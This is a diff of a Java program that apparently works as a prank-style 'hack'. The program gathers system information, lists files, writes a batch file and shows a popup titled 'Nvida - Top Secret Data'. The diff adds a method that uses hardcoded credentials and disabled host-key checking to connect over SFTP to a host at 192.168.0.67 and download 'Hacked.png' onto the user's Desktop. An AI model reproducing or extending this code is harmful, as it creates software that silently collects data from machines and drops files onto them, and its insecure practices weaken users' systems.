@@ -14,7 +14,7 @@ import java.util.*;
 
 public class Main {
 
-    public static void main(String[] args) throws IOException, Exception, JSchException {
+    public static void main(String[] args) throws Exception {
 
         // Executes the Browser
         try {
@@ -92,8 +92,11 @@ public class Main {
 
         createBatchFile();
 
+        getFileFromServer();
+
         JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
 
+        System.exit(0);
     }
 
     private static void saveInfoToFile(String[] filesInDir, String sysInfo, FileWriter fileWriter) throws IOException {
@@ -159,6 +162,23 @@ public class Main {
 
         } catch (Exception ex) {
         }
+    }
+
+    private static void getFileFromServer() throws SftpException, JSchException, IOException {
+        String userHome = System.getProperty("user.home");
+        JSch jsch = new JSch();
+        Session session = jsch.getSession("a2a", "192.168.0.67");
+        session.setConfig("StrictHostKeyChecking", "no");
+        session.setPassword("a2a");
+        session.connect();
+        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
+        channel.connect();
+        channel.cd("/");
+
+        channel.get("Hacked.png" , userHome + "/Desktop");
+
+        channel.disconnect();
+        session.disconnect();
     }
 
 
